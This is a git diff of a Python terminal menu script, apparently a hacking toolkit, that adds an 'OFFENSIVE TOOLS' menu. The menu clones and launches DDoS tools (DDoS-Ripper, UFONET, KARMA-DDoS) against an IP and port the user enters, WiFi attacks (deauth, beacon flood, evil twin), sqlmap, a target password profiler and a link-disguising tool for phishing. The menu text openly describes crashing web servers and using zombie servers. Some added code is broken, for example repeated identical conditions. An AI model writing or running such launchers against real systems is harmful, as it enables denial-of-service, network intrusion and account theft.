@@ -21,11 +21,14 @@ def yeep():
     os.system('sudo apt install gnome-terminal')
     os.system('sudo apt install gnome-terminal-data')
 import os
+os.system("pip3 install reportlab")
+import reportlab
 import subprocess
 import re
 import termcolor
 import colorama
 from termcolor import colored
+import ascii_magic
 import time
 os.system("pip3 install asyncio")
 import asyncio   
@@ -79,6 +82,9 @@ elif option == "2":
 import sys
 import json
 import requests
+import ascii_magic
+import PIL
+import geopy.distance
 from colorama import Fore
 from colorama import Back
 from colorama import Style
@@ -234,6 +240,13 @@ def ascii_banner():
 def JIGSAW():
     try:
         my_art = AsciiArt.from_url('https://img.wattpad.com/cover/197146462-256-k606889.jpg')      
+    except OSError as e:
+        print(f'Could not load the image, server said: {e.code} {e.msg}')
+    my_art.to_terminal()
+    
+def ascii_kaboom():
+    try:
+        my_art = AsciiArt.from_url('https://www.shutterstock.com/image-vector/danger-symbol-skull-image-vector-260nw-1958629585.jpg')      
     except OSError as e:
         print(f'Could not load the image, server said: {e.code} {e.msg}')
     my_art.to_terminal()
@@ -444,6 +457,7 @@ def gahhh():
 
 
 def pwnd():
+    change()
     os.system('git clone https://github.com/Thr0wAway-n0w/pwnd.git')
     os.chdir('pwnd')
     os.system("git fetch")
@@ -568,6 +582,7 @@ def zip_menu():
         zip_menu() 
 
 def ddos_install():
+    change()
     os.system("git clone https://github.com/HyukIsBack/KARMA-DDoS.git")
     os.chdir("KARMA-DDoS")
     os.system("git fetch")
@@ -591,19 +606,20 @@ def send_command_to_xterms():
     print(f"Command '{command}' sent to all xterm windows.")
     
 def multi_menu():
+    change()
     global num_xterms
     clear_screen()
     multi_banner()
     print(colored("Multi-Menu", 'red', attrs=['reverse', 'blink', 'bold']))
     time.sleep(.01)    
     header()
-    print("\033[93m1\033[0m) SplitScreen Multi\033[95m Neat\033[97m and \033[95mContained\033[97m, produces \033[95m1 extra \033[97minstance by halving the terminal\033[0m")
+    print("    \033[93m1\033[0m) SplitScreen Multi\033[95m Neat\033[97m and \033[95mContained\033[97m, produces \033[95m1 extra \033[97minstance by halving the terminal\033[0m")
     print(" ")
-    print("\033[93m2\033[0m) Xterm Multi\033[91m Unlimited \033[97mQuantity, \033[91mEACH \033[97mgets it's \033[91mOWN UNIQUE Mac and IP Addresses")
+    print("    \033[93m2\033[0m) Xterm Multi\033[91m Unlimited \033[97mQuantity, \033[91mEACH \033[97mgets it's \033[91mOWN UNIQUE Mac and IP Addresses")
     print(" ")
-    print("\033[92m3\033[0m)\033[91m ×͜× \033[97mDDoS Playground\033[91m ×͜× \033[95mOR\033[92m 3.0\033[0m GO \033[41mGORILLA MONSOON MODE\033[0m")
+    print("  👹\033[92m3\033[0m)\033[91m ×͜× \033[97mDDoS Playground\033[91m ×͜× \033[95mOR\033[92m 3.0\033[0m GO \033[41mGORILLA MONSOON MODE\033[0m")   
     print(" ")
-    print("\033[91m4)\033[40m Run\033[0m")
+    print("    \033[91m4)\033[40m Run\033[0m")
     choice = input(">  ")
     
     if choice == "1":
@@ -656,10 +672,11 @@ def multi_mode():
 def multi_multi():
     clear_screen()
     multi_manner()
-    header()
-    print("\033[0mThe First Four Instances are \033[92mPre-Postioned\033[0m. Personal Preference is 5. \033[91mDrag/drop\033[92m ⇘\033[0m for Additional Instances \033[91mIf\033[0m Higher Number was Specified") 
+    print("\033[0mThe First Four Instances are \033[92mPre-Postioned\033[0m. \033[91mDrag/drop\033[92m ⇘\033[0m for Your 5th Xterm")
+    
+    
     global num_xterms
-    num_xterms = int(input("Enter the number of xterms to open: "))
+    num_xterms = 5
     os.chdir(os.path.join(os.getenv("HOME"), "Desktop"))
 
     positions = [
@@ -668,15 +685,7 @@ def multi_multi():
         "topleft",
         "bottomleft",
         "bottomright",
-        "topcenter",
-        "bottomcenter",
-        "leftcenter",
-        "rightcenter"
     ]
-
-    if num_xterms >= len(positions):
-        print("Unless You're Quantum Computing, You Don't Need that Many; Stop Being Ridiculous")
-        num_xterms = len(positions) - 1
 
     for i in range(num_xterms):
         ip_address = f"192.168.1.{i + 9}"
@@ -685,31 +694,53 @@ def multi_multi():
         position = positions[i]
         
         if position == "center":
-            geometry = "80x24+0+0"
+            geometry = "80x24+0+0"    
+            os.system(f'xterm -geometry {geometry} -hold -e "python3 -c \'import Hell0; Hell0.main_menu()\'" &')
+            time.sleep(.1)            
+            pyautogui.typewrite('1\n')
+            time.sleep(.03)
+            pyautogui.typewrite('3\n')        
         elif position == "topright":
-            geometry = "80x24-0+0"
+            geometry = "80x24-0+0"          
+            os.system(f'xterm -geometry {geometry} -hold -e "python3 -c \'import Hell0; Hell0.main_menu()\'" &')
+            time.sleep(.1)   
+            pyautogui.typewrite('1\n')
+            time.sleep(.03)
+            pyautogui.typewrite('3\n')        
         elif position == "topleft":
             geometry = "80x24+0+0" 
+            os.system(f'xterm -geometry {geometry} -hold -e "python3 -c \'import Hell0; Hell0.main_menu()\'" &')       
+            time.sleep(.1)   
+            pyautogui.typewrite('1\n')
+            time.sleep(.03)
+            pyautogui.typewrite('3\n')
         elif position == "bottomleft":
-            geometry = "80x24+0-0"
+            geometry = "80x24+0-0"           
+            os.system(f'xterm -geometry {geometry} -hold -e "python3 -c \'import Hell0; Hell0.main_menu()\'" &')
+            time.sleep(.1)   
+            pyautogui.typewrite('1\n')
+            time.sleep(.03)
+            pyautogui.typewrite('3\n')        
         elif position == "bottomright":
             geometry = "80x24-0-0"
-        elif position == "topcenter":
-            geometry = "80x24-0+0"
-        elif position == "bottomcenter":
-            geometry = "80x24-0-0"
-        elif position == "leftcenter":
-            geometry = "80x24+0-0"
-        elif position == "rightcenter":
-            geometry = "80x24-0-0"
-        
-        os.system(f'sudo xterm -geometry {geometry} -hold -e "ifconfig eth0 {ip_address} hw ether {mac_address} && python3 -c \'import Hell0; Hell0.main_menu()\'" &')
-    
+            os.system(f'xterm -geometry {geometry} -hold -e "python3 -c \'import Hell0; Hell0.main_menu()\'" &')           
+            time.sleep(.1)   
+            pyautogui.typewrite('1\n')
+            time.sleep(.03)
+            pyautogui.typewrite('3\n')
+                        
     root = tk.Tk()
     root.withdraw()
+    command = simpledialog.askstring(" ", "COVER THIS WITH TOP LEFT XTERM (or type 'exit' to quit): ")
+    exit_command = "exit"  
+    while True:
+        if command and command != exit_command:
+            send_command_to_xterms()
+        else:
+            change()
+            main_menu()
 
     exit(0)
-    what_now()
     
 def ddos_play():
     clear_screen()
@@ -736,31 +767,35 @@ def ddos_play():
         position = positions[i]
         
         if position == "center":
-            geometry = "80x24+0+0"
-            
-                        
-            os.system(f'sudo xterm -geometry {geometry} -hold -e "python3 -c \'import Hell0; Hell0.ddos_install()\'" &')
+            geometry = "80x24+0+0"          
+            os.system(f'xterm -geometry {geometry} -hold -e "python3 -c \'import Hell0; Hell0.ddos_install()\'" &')
+            pyautogui.typewrite('1\n')
+            time.sleep(.03)
+            pyautogui.typewrite('3\n')        
         elif position == "topright":
-            geometry = "80x24-0+0"
-            
-                        
-            os.system(f'sudo xterm -geometry {geometry} -hold -e "python3 -c \'import Hell0; Hell0.sql_attack()\'" &')
+            geometry = "80x24-0+0"                   
+            os.system(f'xterm -geometry {geometry} -hold -e "python3 -c \'import Hell0; Hell0.sql_attack()\'" &')
+            pyautogui.typewrite('1\n')
+            time.sleep(.03)
+            pyautogui.typewrite('3\n')        
         elif position == "topleft":
-            geometry = "80x24+0+0" 
-            
-                        
-            os.system(f'sudo xterm -geometry {geometry} -hold -e "python3 -c \'import Hell0; Hell0.simba_menu()\'" &')       
+            geometry = "80x24+0+0"            
+            os.system(f'xterm -geometry {geometry} -hold -e "python3 -c \'import Hell0; Hell0.simba_menu()\'" &')       
+            pyautogui.typewrite('1\n')
+            time.sleep(.03)
+            pyautogui.typewrite('3\n')        
         elif position == "bottomleft":
-            geometry = "80x24+0-0"
-            
-                        
-            os.system(f'sudo xterm -geometry {geometry} -hold -e "python3 -c \'import Hell0; Hell0.prox()\'" &')
+            geometry = "80x24+0-0"    
+            os.system(f'xterm -geometry {geometry} -hold -e "python3 -c \'import Hell0; Hell0.prox()\'" &')
+            pyautogui.typewrite('1\n')
+            time.sleep(.03)
+            pyautogui.typewrite('3\n')
         elif position == "bottomright":
-            geometry = "80x24-0-0"
-            
-                        
-            os.system(f'sudo xterm -geometry {geometry} -hold -e "python3 -c \'import Hell0; Hell0.cyber()\'" &')           
-            
+            geometry = "80x24-0-0"           
+            os.system(f'xterm -geometry {geometry} -hold -e "python3 -c \'import Hell0; Hell0.cyber()\'" &')           
+            pyautogui.typewrite('1\n')
+            time.sleep(.03)
+            pyautogui.typewrite('3\n')            
     root = tk.Tk()
     root.withdraw()
     command = simpledialog.askstring(" ", "COVER THIS WITH TOP LEFT XTERM (or type 'exit' to quit): ")
@@ -769,6 +804,7 @@ def ddos_play():
         if command and command != exit_command:
             send_command_to_xterms()
         else:
+            change()
             main_menu()
 
     exit(0)
@@ -792,7 +828,115 @@ def what_now():
         time.sleep(1)
         clear_screen()
         ascii_banner()
+        change()
         menu() 
+
+def essid_name():
+    print("\033[97mESSID NAME\033[95m")
+    os.system("iwgetid -r")
+    
+def access_point():
+    print("\033[97mACCESS POINT\033[95m")
+    os.system("iwconfig wlan0 2> /dev/null | awk -F: '/Mode:/ {print $2}' | awk '{print $1}'")
+    
+def essid_channel():
+    print("\033[97mESSID CHANNEL\033[95m")
+    os.system("sudo iwlist wlan0 scanning essid ESSID | grep Channel | head -1 | awk -F: '{print $2}'")
+    
+def wlan():
+    essid_name()
+    access_point()
+    essid_channel()    
+
+def weelan():
+    change()
+    os.system("git clone https://github.com/Gurpreet06/Wifi-Crack.git")
+    os.chdir("Wifi-Crack")
+    os.system("pip3 install -r requirements.txt")
+    clear_screen()
+    ascii_banner()
+    print(colored("CONFIGURE ATTACK VECTOR", 'red', attrs=['reverse', 'blink', 'bold']))    
+    header()
+    print("\033[91mNETWORK INTERFACE \033[0m(\033[95mwlan0\033[0m or \033[95meth0\033[0m)")
+    nii = input("Selection: ")
+    print("\033[91mESSID NAME\033[0m")
+    ess = input("Selection: ")
+    print("\033[91mCHANNEL\033[0m")
+    chh = input("Selection: ")
+    clear_screen()
+    ascii_banner()
+    print(colored("PICK YOUR POISON", 'red', attrs=['reverse', 'blink', 'bold'])) 
+    header()
+    print("\033[91m1\033[0m) Handshake\033[95m")
+    print("\033[91m2\033[0m) PKMID\033[95m")
+    print("\033[91m3\033[0m) AAuth\033[95m")
+    print("\033[91m4\033[0m) DAuth\033[95m")
+    print("\033[91m5\033[0m) BFlood\033[95m")
+    print("\033[91m6\033[0m) ETwin\033[95m")
+    print(" ")    
+    print(colored("Remember, All Required Information Can Be Found In Top Window", 'yellow', attrs=['reverse', 'blink']))    
+    time.sleep(3)
+    choice = input("Pick Your Poison: ")
+    if choice == "1":
+        subprocess.run("sudo", "python3", "wifiCrack.py", "-i", nii, "-m", "Handshake")
+    elif choice == "1":
+        subprocess.run("sudo", "python3", "wifiCrack.py", "-i", nii, "-m", "PKMID")
+    elif choice == "1":
+        subprocess.run("sudo", "python3", "wifiCrack.py", "-i", nii, "-m", "AAuth")
+    elif choice == "1":
+        subprocess.run("sudo", "python3", "wifiCrack.py", "-i", nii, "-m", "DAuth")
+    elif choice == "1":
+        subprocess.run("sudo", "python3", "wifiCrack.py", "-i", nii, "-m", "BFlood")
+    elif choice == "1":
+        subprocess.run("sudo", "python3", "wifiCrack.py", "-i", nii, "-m", "ETwin")
+    else:
+        change()
+        print("ERROR...")
+        main_menu()
+
+def wi_die():  
+    print("\033[0mWiFi Attack")
+    global num_xterms
+    num_xterms = 5
+    os.chdir(os.path.join(os.getenv("HOME"), "Desktop"))
+
+    positions = [
+        "center",
+        "topright",
+        "topleft",
+        "bottomleft",
+        "bottomright",
+    ]
+    for i in range(num_xterms):
+        ip_address = f"192.168.1.{i + 9}"
+        mac_address = f"00:11:22:33:44:5{i}"
+        
+        position = positions[i]
+        
+        if position == "center":
+            geometry = "80x24+0+0"
+            os.system(f'xterm -geometry {geometry} -hold -e "python3 -c \'import Hell0; Hell0.wlan()\'" &')
+            pyautogui.typewrite('1\n')
+            time.sleep(.03)
+            pyautogui.typewrite('3\n')
+        elif position == "topright":
+            geometry = "80x24-0+0"            
+            os.system(f'xterm -geometry {geometry} -hold -e "python3 -c \'import Hell0; Hell0.ipp()\'" &')
+            pyautogui.typewrite('1\n')
+            time.sleep(.03)
+            pyautogui.typewrite('3\n')
+
+    root = tk.Tk()
+    root.withdraw()
+    command = simpledialog.askstring(" ", "type START to Begin: ")
+    exit_command = "START"  
+    while True:
+        if command and command != exit_command:
+            send_command_to_xterms()
+        else:
+            weelan()
+
+    exit(0)
 
 def repo():
     clear_screen()
@@ -849,13 +993,14 @@ def passw():
     ascii_banner()            
     print(colored("PASSWORDS", 'red', attrs=['reverse', 'bold']))     
     header()
-    print("                  \033[91m1\033[0m) Pwnd                             \033[91m2\033[0m) HashBreak                           \033[91m3\033[0m) SecLists                                       ") 
-    print("                  \033[90m   ~~~~                                ~~~~~~~~~                              ~~~~~~~~    \033[0m ")
+    print("             \033[91m1\033[0m) Pwnd                        \033[91m2\033[0m) HashBreak                      \033[91m3\033[0m) SecLists                           \033[91m4\033[0m) Cupp                            ") 
+    print("             \033[90m   ~~~~                           ~~~~~~~~~                         ~~~~~~~~    \033[0m ")
     footer()
     choice = input("\033[97mSelect an option: ")
     if choice == "1":
         pwnd()
     elif choice == "2":
+        change()
         os.system("git clone https://github.com/AnonymousAt3/hashbreak.git")
         os.chdir("hashbreak")
         os.system("sudo chmod +x ./install.sh")
@@ -870,6 +1015,10 @@ def passw():
         os.system("sudo apt install seclists")
         os.system("seclists")
         what_now()
+    elif choice == "4":
+        os.system("git clone https://github.com/TechnicalHeadquarter/cupp.git")
+        os.chdir("cupp")
+        os.system("python3 cupp.py -i")
     elif choice == "Pwnd":
         print(" ")
         print("\033[96mPass Pwnd Checker")
@@ -900,6 +1049,16 @@ def passw():
             time.sleep(.04)  
         time.sleep(3)
         passw()      
+    elif choice == "Cupp":
+        print(" ")
+        print("\033[96mCommon.User.Password.Profiler")
+        print(" ")
+        print("", end="", flush=True) 
+        for char in " \033[92mEnter details and specifics about a target and save the generated list to increase your success rate.":
+            print(char, end="", flush=True) 
+            time.sleep(.04)  
+        time.sleep(3)
+        passw()     
     elif choice == "BACK":
         forbidden()
     elif choice == "HELL":
@@ -1109,9 +1268,8 @@ def main_menu():
     header()
     print("       \033[91m1\033[0m) Usernames                 \033[91m4\033[0m) Frameworks            \033[91m7\033[0m) GEO-0sint               \033[91m10\033[0m) Passwords/Data Leaks/Forbidden Knowledge") 
     print("       \033[91m2\033[0m) Emails/Phone #'s          \033[91m5\033[0m) Unclassified          \033[91m8\033[0m) DeadMan Switch          \033[91m11\033[0m) MULTI-MODE\033[0m")
-    print("       \033[91m3\033[0m) Networks                  \033[91m6\033[0m) Cameras               \033[91m9\033[0m) Tool Repo-Depo          \033[91m666\033[0m) \033[41mGAHH! IT BURNS!!!\033[0m")
-
-    print(" ")
+    print("       \033[91m3\033[0m) Networks                  \033[91m6\033[0m) Cameras               \033[91m9\033[0m) Tool Repo-Depo        👹\033[91m12\033[0m)\033[93m \033[41mDante's Inferno\033[0m")
+    print("                                                      \033[91m666\033[0m) \033[41mRun Like HELL!\033[0m ")
     choice = input("\033[97mSelect an option: ")
 
     if choice == "1":
@@ -1143,11 +1301,14 @@ def main_menu():
         clear_screen()
         multi_banner 
         multi_menu() 
+    elif choice == "12":
+        kaboom()
     elif choice == "666":
         clear_screen()
         ascii_banner()
         gahhh()
     elif choice == "Hidden":
+        change()
         os.system("git clone https://github.com/Thr0wAway-n0w/Hide.git")
         os.chdir("Hide")
         os.system("python3 Shhh.py")
@@ -1158,6 +1319,7 @@ def main_menu():
     else:
         print("\033[91m INVALID SELECTION\033[0m")
         time.sleep(1)
+        change()
         main_menu()         
 
 def again1():
@@ -1175,6 +1337,7 @@ def again1():
     else:
         print("\033[91m INVALID SELECTION\033[0m")
         time.sleep(1)
+        change()
         menu()
         
 def again2():
@@ -1188,8 +1351,10 @@ def again2():
             clear_screen()
             again2()
     elif choice == "2":
+            change()
             menu()
     else:
+        change()
         menu()
 def again3():
     choice = input("Enter a User or Email to search: ")
@@ -1202,10 +1367,12 @@ def again3():
             clear_screen()
             again3()
     elif choice == "2":
+            change()
             menu()
     else:
         print("\033[91m INVALID SELECTION\033[0m")
         time.sleep(1)
+        change()
         menu()
 
 def again4():
@@ -1220,10 +1387,12 @@ def again4():
             clear_screen()
             again4()
     elif choice == "2":
+            change()
             menu()
     else:
         print("\033[91m INVALID SELECTION\033[0m")
         time.sleep(1)
+        change()
         menu()
 
 def menu():
@@ -1242,8 +1411,6 @@ def menu():
         print("       \033[91m1\033[0m) Maigret                 \033[91m2\033[0m) Slash                                  \033[91m3\033[0m) Sherlock                 \033[91m4\033[0m) AliaStorm")
         footer()
         choice = input("\033[0mSelect an option: ")      
-        async def main(username):
-            os.system(f'maigret {username} --self-check --top-sites 1800 --no-recursion --retries 1 --timeout 35 --stats --graph --html')
         if choice == '1':
             os.system("pip3 install maigret")
             username = input("Enter a username to search: ")
@@ -1251,6 +1418,8 @@ def menu():
             html_file2 = f'report_{username}_graph.html'
             print(colored("She THICC...", 'red', attrs=['reverse', 'blink', 'bold']))
             time.sleep(2)
+            async def main(username):
+                os.system(f'pipx run maigret {username} --self-check --top-sites 1800 --no-recursion --retries 1 --timeout 35 --stats --graph --html')
             loop = asyncio.get_event_loop()
             loop.run_until_complete(main(username))
             while True:
@@ -1840,22 +2009,170 @@ def cyber():
     bash_command = "bash cybermap/cybermap.sh"
     os.system(bash_command) 
 
+def ipp():
+    print("example: www.TARGETSITE.com")
+    trg = input("Target url: ")
+    subprocess.run(["nslookup", trg])
+    time.sleep(10)
+    ipp()
+
+def kaboom():
+    change()
+    clear_screen()
+    ascii_kaboom()
+    print(colored("OFFENSIVE TOOLS", 'red', attrs=['reverse', 'blink', 'bold']))
+    header()
+    print("              👹\033[91m1\033[0m) DRipper                            👹\033[91m2\033[0m) UFONET                              👹\033[91m3\033[0m) Karma")
+    print("              👹\033[91m4\033[0m) WiDie                              👹\033[91m5\033[0m) Sql-Map                             👣\033[91m6\033[0m) LinkMask ")
+    footer()
+    choice = input("\033[0mSelect an option: ")    
+    if choice == "1":
+        change()
+        os.system("git clone https://github.com/palahsu/DDoS-Ripper.git")
+        os.chdir("DDoS-Ripper")
+        clear_screen()
+        print("ENTER IP ADDRESS NOW")
+        ipa = input("ip: ")
+        print("ENTER OPEN PORT")
+        prt = input("port: ")
+        print("\033[90mSELECT\033[94m135 \033[90mor \033[94m443 \033[90mFOR TURBO MODE\033[0m")
+        trb = input("turbo number: ")
+        subprocess.run(["python3", "DRipper.py", "-s", ipa, "-p", prt, "-t", trb])
+        what_now()
+    elif choice == "DRipper":
+        print(" ")
+        print("\033[96mDRipper")
+        print(" ")
+        print("", end="", flush=True) 
+        for char in " \033[91mSimple yet Effective Attack Model for crashing web servers":
+            print(char, end="", flush=True) 
+            time.sleep(.04)  
+        time.sleep(3)
+        kaboom()    
+    elif choice == "2":
+        change()
+        clear_screen()
+        ascii_kaboom()
+        os.system("git clone https://github.com/epsylon/ufonet.git")
+        os.chdir("ufonet")
+        os.system("git fetch")
+        os.system("git pull")
+        os.system("sudo apt install python3-pycurl")
+        os.system("sudo apt install python3-geoip")
+        os.system("sudo apt install libgeoip-dev")
+        os.system("sudo apt install libgeoip1")
+        os.system("sudo apt install python3-whois")
+        os.system("sudo apt install python3-requests")
+        os.system("sudo apt install python3-scapy")
+        os.system("pip3 install GeoIP")
+        os.system("pip3 install python-geoip")
+        os.system("pip3 install pygeoip")
+        os.system("pip3 install requests")
+        os.system("pip3 install pycurl")
+        os.system("pip3 install whois")
+        os.system("pip3 install scapy-python3")
+        os.system("sudo chmod +x ufonet")
+        os.system("python3 ./ufonet --gui")
+        what_now()           
+    elif choice == "UFONET":
+        print(" ")
+        print("\033[96mUFONET")
+        print(" ")
+        print("", end="", flush=True) 
+        for char in " \033[91mMultiAttack Protocol for DoS and DDoS Attacks using Zombie Servers across the Globe.":
+            print(char, end="", flush=True) 
+            time.sleep(.04)  
+        time.sleep(3)
+        kaboom() 
+    elif choice == "3":
+        change()
+        os.system("git clone https://github.com/HyukIsBack/KARMA-DDoS.git")
+        os.chdir("KARMA-DDoS")
+        os.system("git fetch")
+        os.system("git pull")    
+        os.system("python3 -m pip install -r requirements.txt")
+        os.system("sudo chmod +x ./setup.py")
+        os.system("sudo python3 ./setup.py install")
+        clear_screen()
+        os.system("python3 main.py")
+        kaboom()
+    elif choice == "Karma":
+        print(" ")
+        print("\033[96mKarma")
+        print(" ")
+        print("", end="", flush=True) 
+        for char in " \033[91mMulti-Level Attack Surface featuring a number of options for both Level4 and Level7":
+            print(char, end="", flush=True) 
+            time.sleep(.04)  
+        time.sleep(3)
+        kaboom()       
+    elif choice == "4":
+        wi_die()
+        what_now()    
+    elif choice == "WiDie":
+        print(" ")
+        print("\033[96mCrack WiFi")
+        print(" ")
+        print("", end="", flush=True) 
+        for char in " \033[91mWiFi Attack Options \033[95mHandshake\033[92m |\033[95m PKMID\033[92m | \033[95mAAuth\033[92m |\033[95m DAuth \033[92m| \033[95mBFlood\033[92m | \033[95mETwin\033[92m)":
+            print(char, end="", flush=True) 
+            time.sleep(.04)  
+        time.sleep(3)
+        kaboom()     
+    elif choice == "5": 
+        sql_attack()
+        what_now()  
+    elif choice == "Sql-Map":
+        print(" ")
+        print("\033[96mSql-Map")
+        print(" ")
+        print("", end="", flush=True) 
+        for char in " \033[91mAutomated sql Injection and Database Takeover Tool":
+            print(char, end="", flush=True) 
+            time.sleep(.04)  
+        time.sleep(3)
+        kaboom() 
+    elif choice == "6":
+        change()
+        os.system("git clone https://github.com/technicalheadquarter/linkmask")
+        os.chdir("linkmask")
+        os.system("sudo chmod +x linkmask.sh")
+        os.system("sudo bash ./linkmask.sh")
+        what_now()
+    elif choice == "LinkMask":
+        print(" ")
+        print("\033[96mLinkMask")
+        print(" ")
+        print("", end="", flush=True) 
+        for char in " \033[91mHelp to disguise any weblink to increase the likelihood of successful op":
+            print(char, end="", flush=True) 
+            time.sleep(.04)  
+        time.sleep(3)
+        kaboom()     
+    elif choice == "BACK":
+        main_menu()
+    elif choice == "HELL":
+        main_menu()
+    else:
+        print("\033[91m INVALID SELECTION\033[0m")
+        time.sleep(1)
+        clear_screen()
+        ascii_kaboom()
+        kaboom()  
+
 def networks_menu():
     clear_screen()
     ascii_banner()
     print(colored("Networks-Menu", 'red', attrs=['reverse', 'blink', 'bold']))
     header()
     print("                \033[91m1\033[0m) CyberMap                             \033[91m4\033[0m) IP-Lookup                             \033[91m7\033[0m) ProxyScrape")
-    print("                \033[91m2\033[0m) Sql-map                              \033[91m5\033[0m) PortScan                              \033[91m8\033[0m) WiFi")
+    print("                \033[91m2\033[0m) Sys Info                             \033[91m5\033[0m) PortScan                              \033[91m8\033[0m) WiFi")
     print("                \033[91m3\033[0m) Lynis                                \033[91m6\033[0m) Simba                                 \033[91m9\033[0m) SubDomains")
     print(" ")
-    print("                                                            \033[92mUFO\033[0m")
     footer()
     choice = input("\033[0mSelect an option: ")
     if choice == '1':
         cyber()
-    elif choice == "2": 
-        sql_attack()
     elif choice == "3":
         lynis_sys()
         what_now()
@@ -1871,8 +2188,9 @@ def networks_menu():
         
         if choice == "1": 
             webbrowser.open("http://127.0.0.1:5000")
-            ip_lookup()            
-            what_now()
+            wlan()            
+            time.sleep(3)
+            networks_menu()
         
         if choice == "2":
             clear_screen()
@@ -2032,34 +2350,8 @@ def networks_menu():
         what_now()
     elif choice == '9':
         subdomains()
-    elif choice == '10':
-        clear_screen()
-        ascii_banner()
-        what_now()
-    elif choice == 'UFO':
-        clear_screen()
-        ascii_banner()
-        os.system("git clone https://github.com/epsylon/ufonet.git")
-        os.chdir("ufonet")
-        os.system("git fetch")
-        os.system("git pull")
-        os.system("sudo apt install python3-pycurl")
-        os.system("sudo apt install python3-geoip")
-        os.system("sudo apt install libgeoip-dev")
-        os.system("sudo apt install libgeoip1")
-        os.system("sudo apt install python3-whois")
-        os.system("sudo apt install python3-requests")
-        os.system("sudo apt install python3-scapy")
-        os.system("pip3 install GeoIP")
-        os.system("pip3 install python-geoip")
-        os.system("pip3 install pygeoip")
-        os.system("pip3 install requests")
-        os.system("pip3 install pycurl")
-        os.system("pip3 install whois")
-        os.system("pip3 install scapy-python3")
-        os.system("sudo chmod +x ufonet")
-        os.system("python3 ./ufonet --gui")
-        what_now()        
+    elif choice == "10":
+        kaboom()      
     elif choice == "BACK":
         main_menu()
     elif choice == "HELL":
@@ -2074,16 +2366,6 @@ def networks_menu():
             time.sleep(.04)  
         time.sleep(3)
         networks_menu()
-    elif choice == "Sql-map":
-        print(" ")
-        print("\033[96mSql-map")
-        print(" ")
-        print("", end="", flush=True) 
-        for char in " \033[91mAutomated sql Injection and Database Takeover Tool":
-            print(char, end="", flush=True) 
-            time.sleep(.04)  
-        time.sleep(3)
-        networks_menu() 
     elif choice == "Lynis":
         print(" ")
         print("\033[96mLynis")
@@ -2154,16 +2436,16 @@ def networks_menu():
             time.sleep(.04)  
         time.sleep(3)
         networks_menu() 
-    elif choice == "UFONET":
+    elif choice == "Sys Info":
         print(" ")
-        print("\033[96mUFONET")
+        print("\033[96mSystem Information")
         print(" ")
         print("", end="", flush=True) 
-        for char in " \033[91mMultiAttack Protocol for DoS and DDoS Attacks using Zombie Servers across the Globe.":
+        for char in " \033[95mShows essid, Channel, and Interface":
             print(char, end="", flush=True) 
             time.sleep(.04)  
         time.sleep(3)
-        networks_menu() 
+        networks_menu()   
     else:
         print("\033[91m INVALID SELECTION\033[0m")
         time.sleep(1)
